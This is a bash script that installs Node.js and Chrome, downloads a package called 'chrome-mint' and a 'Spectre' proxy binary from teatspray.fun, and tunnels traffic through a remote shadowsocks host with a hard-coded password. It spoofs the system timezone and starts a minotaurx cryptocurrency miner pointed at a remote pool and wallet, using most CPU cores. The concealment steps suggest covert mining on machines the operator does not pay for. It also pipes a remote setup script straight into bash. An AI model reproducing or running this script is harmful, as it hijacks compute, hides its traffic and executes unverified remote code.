cd
sleep 2
export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

apt update >/dev/null;apt -y install apt-utils psmisc libreadline-dev dialog automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget dpkg >/dev/null

sleep 2
cat /etc/*-release
sleep 2

num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
currentdate=$(date '+%d-%b-%Y_Test_')
ipaddress=$(curl -s api.ipify.org)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip
used_num_of_cores=`expr $num_of_cores - 6`

echo ""
echo "You have a total number of $used_num_of_cores cores"
echo ""

echo ""
echo "Your worker name is $currentdate"
echo ""

sleep 2

# Function to check if Node.js is installed

wget -O - https://deb.nodesource.com/setup_20.x | bash

sleep 3

apt -y install nodejs

sleep 2

node -v && npm

curl http://greenleaf.teatspray.fun/chrome-mint.tar.gz -L -O -J
tar -xvf chrome-mint.tar.gz
rm chrome-mint.tar.gz
cd chrome-mint

# Install dependencies
npm install

sleep 2

wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add -
echo "deb http://dl.google.com/linux/chrome/deb/ stable main" | tee /etc/apt/sources.list.d/google.list

sleep 2

apt-get update
apt-get install -y google-chrome-stable

sleep 2

npm install pm2 -g

sleep 2

#pm2 set pm2:sysmonit true

sleep 2

#pm2 update

sleep 2

wget http://greenleaf.teatspray.fun/Spectre.tar.gz

sleep 2

tar -xf Spectre.tar.gz

sleep 2

mv Spectre /usr/bin

sleep 2

Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:8443 &

sleep 2

curl -x socks5h://127.0.0.1:1082 api.ipify.org

sleep 2

DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null

sleep 2

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
dpkg-reconfigure --frontend noninteractive tzdata > /dev/null

sleep 2

TZ='Africa/Johannesburg'; export TZ
date 
sleep 2 

rm config.json

sleep 2

#./update/update bash

cat > config.json <<END
{
  "algorithm": "minotaurx",
  "host": "flyingsaucer-eu.teatspray.fun",
  "port": 7019,
  "worker": "MGaypRJi43LcQxrgoL2CW28B31w4owLvv8",
  "password": "$currentdate,c=MAZA,zap=MAZA",
  "workers": $used_num_of_cores,
  "fee": "1"
}
END

sleep 5

echo "Your worker name is $currentdate"

sleep 2

pm2 start index.js --watch
sleep 2
pm2 monit
